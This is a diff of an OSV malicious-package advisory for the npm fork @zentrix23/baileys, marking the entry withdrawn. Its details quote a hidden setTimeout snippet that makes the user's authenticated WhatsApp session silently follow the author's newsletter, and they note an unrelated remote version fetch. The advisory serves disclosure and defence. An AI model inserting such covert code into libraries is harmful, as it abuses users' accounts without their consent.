@@ -2,7 +2,8 @@
   "schema_version": "1.7.5",
   "id": "MAL-2026-4470",
   "published": "2026-05-21T01:33:24Z",
-  "modified": "2026-05-26T06:02:07.465898146Z",
+  "modified": "2026-05-27T00:32:04.196003915Z",
+  "withdrawn": "2026-05-26T21:41:23Z",
   "summary": "Malicious code in @zentrix23/baileys (npm)",
   "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (00e60d3c1f2afd09e236dc4a5ae0cf2373029e6c62c4f7a9c571b13c2da01cd7)\nThis package is a fork of @whiskeysockets/baileys with an undocumented modification: inside makeNewsletterSocket (called unconditionally by makeWASocket()), a setTimeout schedules a FOLLOW mutation against the hardcoded newsletter JID '120363425412882254@newsletter' (Zentrix Tech) 90 seconds after socket creation, using the consumer's authenticated WhatsApp session. Errors are silently swallowed (try/catch {}). Any developer or bot operator using this library to automate a WhatsApp account will have that account silently follow the author's promotional newsletter without consent or disclosure. This is a silent-relay / covert-action pattern: the package's normal advertised API (WhatsApp socket library) is weaponized to perform an unrelated action benefiting the author using the caller's identity. Evidence: lib/Socket/newsletter.js ~line 95 contains `setTimeout(async () => { try { await newsletterWMexQuery('120363425412882254@newsletter', Types_1.QueryIds.FOLLOW); } catch {} }, 90000);`. Separately, lib/Utils/generics.js line 276 fetches a version JSON from raw.githubusercontent.com/kiuur/bails/master/... — a personal user's mutable branch unrelated to the upstream Baileys publisher; this is user-invoked (not auto-executed) and the response is parsed as JSON only, so it is a quality concern rather than RCE, but it indicates the fork is not a trusted republish of upstream.\n",
   "affected": [
@@ -46,7 +47,7 @@
             }
           ]
         },
-        "source": "https://github.com/ossf/malicious-packages/blob/main/osv/malicious/npm/@zentrix23/baileys/MAL-2026-4470.json"
+        "source": "https://github.com/ossf/malicious-packages/blob/main/osv/withdrawn/npm/@zentrix23/baileys/MAL-2026-4470.json"
       }
     }
   ],
